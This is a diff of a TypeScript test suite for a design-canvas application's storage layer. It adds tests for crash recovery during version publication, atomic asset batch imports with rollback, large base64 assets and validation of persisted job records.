+          listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"),
+          /publication recovery must complete/i,
+        );
+        const storedProject = JSON.parse(await readFile(join(designDir, "project.json"), "utf8"));
+        assert.equal(storedProject.nodes[0]?.currentVersionId, null);
+        const storedJob = JSON.parse(await readFile(join(designDir, "jobs", `${fixture.job.id}.json`), "utf8"));
+        assert.equal(storedJob.status, "validating");
+      } else {
+        assert.equal((await getDesignCanvas(fixture.dataDir, fixture.projectId)).nodes[0]?.currentVersionId, null);
+        assert.deepEqual(await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"), []);
+        assert.equal((await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id)).status, "cancelled");
+      }
+    } finally {
+      await rm(fixture.dataDir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("publication recovery rolls back a crash during pending payload construction", async () => {
+  for (const crashPoint of ["directory", "index"] as const) {
+    const fixture = await validatingPublicationFixture(`mid-pending-${crashPoint}`);
+    try {
+      await assert.rejects(
+        publishDesignVersion(fixture.dataDir, fixture.projectId, {
+          nodeId: "node-page",
+          html: "<!doctype html><html><head></head><body>partial</body></html>",
+          contextHash: fixture.job.contextHash!,
+          canvasRevision: fixture.job.canvasRevision!,
+          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+          jobId: fixture.job.id,
+          runnerId: fixture.job.runnerId,
+          model: fixture.job.model,
+        }, 6_000, {
+          simulateProcessCrash: true,
+          afterPendingDirectory() {
+            if (crashPoint === "directory") throw new Error("crash after pending directory");
+          },
+          afterPendingIndex() {
+            if (crashPoint === "index") throw new Error("crash after pending index");
+          },
+        }),
+        /crash after pending/,
+      );
+
+      const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 7_000);
+      assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "cancelled");
+      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+      assert.equal(canvas.nodes[0]?.activeJobId, null);
+      assert.equal(canvas.nodes[0]?.currentVersionId, null);
+      assert.deepEqual(await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"), []);
+      assert.deepEqual(
+        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
+        [],
+      );
+      assert.deepEqual(
+        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "nodes", "node-page", ".pending", "versions")),
+        [],
+      );
+    } finally {
+      await rm(fixture.dataDir, { recursive: true, force: true });
+    }
+  }
+});
+
 test("Design assets are project-owned, content-addressed, and can ingest an existing safe ref", async () => {
   const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-assets-"));
   const projectId = "project-assets";
@@ -613,19 +2057,19 @@ test("Design assets are project-owned, content-addressed, and can ingest an exis
     assert.equal(served.manifest.checksum, first.checksum);
 
     const beforeCanvas = await getDesignCanvas(dataDir, projectId);
-    await assert.rejects(
-      mutateDesignCanvas(dataDir, projectId, {
-        expectedRevision: beforeCanvas.revision,
-        intents: [{ type: "add-node", node: { id: "bad-video", kind: "video", assetId: first.id } }],
-      }),
-      /mimeType.*kind/i,
-    );
+    await assert.rejects(importDesignCanvasAssetBatch(dataDir, projectId, {
+      expectedRevision: beforeCanvas.revision,
+      items: [{
+        asset: { name: "hero image.png", mimeType: "image/png", base64: bytes.toString("base64") },
+        binding: { type: "create-node", node: { id: "bad-video", kind: "video" } },
+      }],
+    }), /mimeType.*kind/i);
     await assert.rejects(
       mutateDesignCanvas(dataDir, projectId, {
         expectedRevision: beforeCanvas.revision,
         intents: [{ type: "add-node", node: { id: "missing-image", kind: "image", assetId: "asset-00000000000000000000000000000000" } }],
       }),
-      /unavailable|missing/i,
+      /atomic Asset import API/i,
     );
 
     await assert.rejects(
@@ -636,6 +2080,26 @@ test("Design assets are project-owned, content-addressed, and can ingest an exis
       }),
       /uploadedFileId/i,
     );
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("large canonical base64 Assets do not overflow the JavaScript call stack", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-large-base64-"));
+  const projectId = "project-large-base64";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const bytes = Buffer.alloc(4 * 1024 * 1024 + 8, 0x61);
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(bytes);
+    const stored = await storeDesignAsset(dataDir, projectId, {
+      name: "large.png",
+      mimeType: "image/png",
+      base64: bytes.toString("base64"),
+    });
+    assert.equal(stored.bytes, bytes.length);
+    const resolved = await resolveDesignAssetFile(dataDir, projectId, stored.id, stored.fileName);
+    assert.deepEqual(await readFile(resolved.path), bytes);
   } finally {
     await rm(dataDir, { recursive: true, force: true });
   }
@@ -661,11 +2125,11 @@ test("Asset batches atomically bind material Nodes, roll back failures, and reco
       items: [
         {
           asset: { name: "new-before-failure.png", mimeType: "image/png", base64: png.toString("base64") },
-          node: { id: "node-new-before-failure", kind: "image" },
+          binding: { type: "create-node", node: { id: "node-new-before-failure", kind: "image" } },
         },
         {
           asset: { name: "invalid.png", mimeType: "image/png", base64: "not-canonical-base64" },
-          node: { id: "node-invalid", kind: "image" },
+          binding: { type: "create-node", node: { id: "node-invalid", kind: "image" } },
         },
       ],
     }), /base64/i);
@@ -678,11 +2142,11 @@ test("Asset batches atomically bind material Nodes, roll back failures, and reco
       items: [
         {
           asset: { name: "hero.png", mimeType: "image/png", base64: png.toString("base64") },
-          node: { id: "node-hero", kind: "image", name: "Hero", geometry: { x: 20, y: 40 } },
+          binding: { type: "create-node", node: { id: "node-hero", kind: "image", name: "Hero", geometry: { x: 20, y: 40 } } },
         },
         {
           asset: { name: "detail.png", mimeType: "image/png", base64: png.toString("base64") },
-          node: { id: "node-detail", kind: "image", name: "Detail", geometry: { x: 420, y: 40 } },
+          binding: { type: "create-node", node: { id: "node-detail", kind: "image", name: "Detail", geometry: { x: 420, y: 40 } } },
         },
       ],
     }, 500);
@@ -694,33 +2158,67 @@ test("Asset batches atomically bind material Nodes, roll back failures, and reco
     ]);
     assert.equal((await listDesignAssets(dataDir, projectId)).length, 3);
 
-    const orphan = await storeDesignAsset(dataDir, projectId, {
-      name: "crash-orphan.png",
-      mimeType: "image/png",
-      base64: png.toString("base64"),
-    });
-    const transactionRoot = join(
-      dataDir,
-      "projects",
-      projectId,
-      "design",
-      "assets",
-      ".transactions",
-      "import-crash-test",
-    );
-    await mkdir(transactionRoot, { recursive: true });
-    await writeFile(join(transactionRoot, "transaction.json"), `${JSON.stringify({
-      schemaVersion: 1,
+    const crashPng = Buffer.concat([png, Buffer.from(" crash-only")]);
+    await assert.rejects(importDesignCanvasAssetBatch(dataDir, projectId, {
       expectedRevision: 1,
-      nextRevision: 2,
-      createdAssetIds: [orphan.id],
-      bindings: [{ nodeId: "node-never-committed", assetId: orphan.id }],
-    })}\n`);
+      items: [{
+        asset: { name: "crash-orphan.png", mimeType: "image/png", base64: crashPng.toString("base64") },
+        binding: { type: "create-node", node: { id: "node-never-committed", kind: "image" } },
+      }],
+    }, 600, {
+      simulateProcessCrash: true,
+      afterPhase: (phase) => {
+        if (phase === "marker") throw new Error("simulated import crash after marker");
+      },
+    }), /simulated import crash/);
 
     const recovered = await getDesignCanvas(dataDir, projectId);
     assert.equal(recovered.revision, 1);
-    assert.ok(!(await listDesignAssets(dataDir, projectId)).some((asset) => asset.id === orphan.id));
-    await assert.rejects(readFile(join(transactionRoot, "transaction.json")), /ENOENT/);
+    assert.ok(!recovered.nodeOrder.includes("node-never-committed"));
+    assert.ok(!(await listDesignAssets(dataDir, projectId)).some((asset) => asset.name === "crash-orphan.png"));
+    const transactions = await readdir(join(dataDir, "projects", projectId, "design", "assets", ".transactions"));
+    assert.deepEqual(transactions, []);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("a material import publishes v1 and resolves its immutable Asset preview", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-material-v1-"));
+  const projectId = "project-material-v1";
+  const bytes = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.from("material v1"),
+  ]);
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const canvas = await importDesignCanvasAssetBatch(dataDir, projectId, {
+      expectedRevision: 0,
+      items: [{
+        asset: { name: "material.png", mimeType: "image/png", base64: bytes.toString("base64") },
+        binding: { type: "create-node", node: { id: "node-material", kind: "image" } },
+      }],
+    }, 100);
+
+    const node = canvas.nodes[0]!;
+    assert.equal(node.versionCount, 1);
+    assert.equal(node.currentVersionId, node.selectedVersionId);
+    assert.ok(node.currentVersionId);
+    const versions = await listDesignVersions(dataDir, projectId, node.id);
+    assert.equal(versions.length, 1);
+    assert.equal(versions[0]?.contentKind, "asset");
+    assert.equal(versions[0]?.assetId, node.assetId);
+    const preview = await resolveDesignVersionPreview(
+      dataDir,
+      projectId,
+      node.id,
+      node.currentVersionId!,
+    );
+    assert.equal(preview.kind, "asset");
+    if (preview.kind === "asset") {
+      assert.equal(preview.assetManifest.id, node.assetId);
+      assert.deepEqual(await readFile(preview.path), bytes);
+    }
   } finally {
     await rm(dataDir, { recursive: true, force: true });
   }
@@ -777,7 +2275,7 @@ test("Asset batch byte limits include every bundled byte copied from a cross-pro
             versionId: version.manifest.id,
           },
         },
-        node: { id: "node-import", kind: "document" },
+        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
       }],
     }), /batch exceeds its bounded size/i);
 
@@ -909,12 +2407,22 @@ test("an exact cross-project Design Version is checksum-verified and byte-copied
       `/api/projects/${sourceProjectId}/design-canvas/assets/${sourceImage.id}/${sourceImage.fileName}?nodeId=node-source&versionId=${version.manifest.id}&checksum=${sourceImage.checksum}`,
     );
     await writeFile(sourceFile.path, canonicalSource);
-    await mutateDesignCanvas(dataDir, targetProjectId, {
+    await importDesignCanvasAssetBatch(dataDir, targetProjectId, {
       expectedRevision: 0,
-      intents: [{ type: "add-node", node: { id: "node-import", kind: "document", assetId: asset.id } }],
+      items: [{
+        asset: {
+          name: "Imported exact version",
+          sourceVersion: { projectId: sourceProjectId, nodeId: "node-source", versionId: version.manifest.id },
+        },
+        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
+      }],
     });
     await rm(join(dataDir, "projects", sourceProjectId, "design"), { recursive: true, force: true });
-    const created = await createDesignJob(dataDir, targetProjectId, { kind: "node-analysis", nodeId: "node-import" });
+    const created = await createDesignJob(dataDir, targetProjectId, {
+      kind: "node-analysis",
+      ...FIXTURE_JOB_IDENTITY,
+      nodeId: "node-import",
+    });
     const context = await getDesignJobContext(dataDir, targetProjectId, created.job.id);
     const stagingDir = join(dataDir, "materialized-import");
     await mkdir(stagingDir, { recursive: true });
@@ -980,8 +2488,19 @@ test("persisted Design Version, Thread, and Job records reject unbounded or unex
     }] })}\n`);
     await assert.rejects(getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" }), /invalid|unexpected|corrupt/i);
 
-    const created = await createDesignJob(dataDir, projectId, { kind: "node-generation", nodeId: "node-page" });
+    const created = await createDesignJob(dataDir, projectId, {
+      kind: "node-generation",
+      runnerId: "fixture",
+      model: "fixture-model",
+      nodeId: "node-page",
+    });
     const jobPath = join(dataDir, "projects", projectId, "design", "jobs", `${created.job.id}.json`);
+    const { runnerId: _runnerId, ...missingRunnerId } = created.job;
+    await writeFile(jobPath, `${JSON.stringify(missingRunnerId)}\n`);
+    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
+    const { model: _model, ...missingModel } = created.job;
+    await writeFile(jobPath, `${JSON.stringify(missingModel)}\n`);
+    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
     await writeFile(jobPath, `${JSON.stringify({
       ...created.job,
       status: "ready",
@@ -999,21 +2518,31 @@ test("document Nodes accept common Office MIME types and identical bytes cannot 
   const projectId = "project-office";
   try {
     await initializeDesignProject(dataDir, projectId);
-    const docx = await storeDesignAsset(dataDir, projectId, {
+    const docxBytes = Buffer.from("opaque docx");
+    const pptxBytes = Buffer.from("opaque pptx");
+    const docxMime = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
+    const pptxMime = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
+    await storeDesignAsset(dataDir, projectId, {
       name: "brief.docx",
-      mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
-      base64: Buffer.from("opaque docx").toString("base64"),
+      mimeType: docxMime,
+      base64: docxBytes.toString("base64"),
     });
-    const pptx = await storeDesignAsset(dataDir, projectId, {
+    await storeDesignAsset(dataDir, projectId, {
       name: "deck.pptx",
-      mimeType: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-      base64: Buffer.from("opaque pptx").toString("base64"),
+      mimeType: pptxMime,
+      base64: pptxBytes.toString("base64"),
     });
-    const added = await mutateDesignCanvas(dataDir, projectId, {
+    const added = await importDesignCanvasAssetBatch(dataDir, projectId, {
       expectedRevision: 0,
-      intents: [
-        { type: "add-node", node: { id: "node-docx", kind: "document", assetId: docx.id } },
-        { type: "add-node", node: { id: "node-pptx", kind: "document", assetId: pptx.id } },
+      items: [
+        {
+          asset: { name: "brief.docx", mimeType: docxMime, base64: docxBytes.toString("base64") },
+          binding: { type: "create-node", node: { id: "node-docx", kind: "document" } },
+        },
+        {
+          asset: { name: "deck.pptx", mimeType: pptxMime, base64: pptxBytes.toString("base64") },
+          binding: { type: "create-node", node: { id: "node-pptx", kind: "document" } },
+        },
       ],
     });
     assert.deepEqual(added.nodes.map((node) => node.state), ["ready", "ready"]);
